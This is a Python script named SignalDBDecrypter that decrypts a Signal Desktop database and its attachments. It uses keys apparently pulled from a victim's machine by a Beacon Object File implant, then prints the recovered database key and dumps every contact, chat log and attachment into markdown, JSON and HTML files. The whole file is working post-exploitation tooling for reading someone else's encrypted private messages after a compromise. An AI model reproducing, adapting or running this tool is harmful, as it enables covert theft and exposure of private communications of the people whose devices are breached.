import argparse
import base64
from Crypto.Cipher import AES
from sqlcipher3 import dbapi2
import json
from pathlib import Path
from typing import Optional

from typer import Exit, colors, secho

from helpers import create, data, files, html, logging, merge, utils

parser = argparse.ArgumentParser(
                    prog='SignalDBDecrypter',
                    description='Decrypt Signal Chat and Attachments',
                    epilog='Made by 0xRedpoll')

parser.add_argument("-d", "--db", help="DB file, you'll have to download this yourself from %APPDATA%\\Signal\\sql\\db.sqlite", required=True, dest="db")
parser.add_argument("-ck", "--config-key", help="Config key returned from the BOF. Hint: It is the longer string", required=True, dest="ck")
parser.add_argument("-dk", "--decryption-key", help="Base64 encoded decryption key from the BOF. Hint: It is the shorter string", required=True, dest="dk")
parser.add_argument("-a", "--attachment-folder", help="Pointing to folder containing attachments. Hint: Download folder at %APPDATA%\\Signal\\attachments.noindex", required=True, dest="a")
parser.add_argument("-dest", "--destination-folder", help="Name of output folder", required=True, dest="destination")

args = parser.parse_args()

def get_key():
    config_key = args.ck
    decryption_key = args.dk

    decryption_key_hex = base64.b64decode(decryption_key)

    configKey_struct = memoryview(bytearray.fromhex(config_key))
    key = AES.new(decryption_key_hex, AES.MODE_GCM, nonce=configKey_struct[3:15]).decrypt_and_verify(configKey_struct[15:79], configKey_struct[79:])
    return key.decode("ascii")


def main():
    dest = args.destination
    key = get_key()
    print(key)
    db_file = args.db

    convos, contacts = data.fetch_data(key=key,db_file=db_file,
        chats="",
        include_empty=True,
    )

    names = sorted(v.name for v in contacts.values() if v.name is not None)
    secho(" | ".join(names))

    dest = Path(dest).expanduser()
    if not dest.is_dir():
        dest.mkdir(parents=True, exist_ok=True)

    contacts = utils.fix_names(contacts)

    secho("Copying and renaming attachments")
    files.copy_attachments(args.a, dest, convos, contacts)

    secho("Creating output files")
    chat_dict = create.create_chats(convos, contacts)

    chat_log_file = dest / "all_chat_logs.txt"
    contact_list_file = dest / "contacts.txt"

    chat_log_file_f = chat_log_file.open("w", encoding="utf-8")
    contact_list_file_f = contact_list_file.open("w", encoding="utf-8")
    
    print(names, file=contact_list_file_f)

    html.prep_html(dest)
    for key, messages in chat_dict.items():
        if messages == []:
            continue
        name = contacts[key].name
        # some contact names are None
        if not name:
            name = "None"

        md_path = dest / name / "chat.md"
        js_path = dest / name / "data.json"

        md_f = md_path.open("a", encoding="utf-8")
        js_f = js_path.open("a", encoding="utf-8")
        try:
            for msg in messages:
                print(msg.to_md(), file=chat_log_file_f)
                print(msg.to_md(), file=md_f)
                print(msg.dict_str(), file=js_f)
        finally:
            md_f.close()
            js_f.close()
    secho("Done!", fg=colors.GREEN)

main()
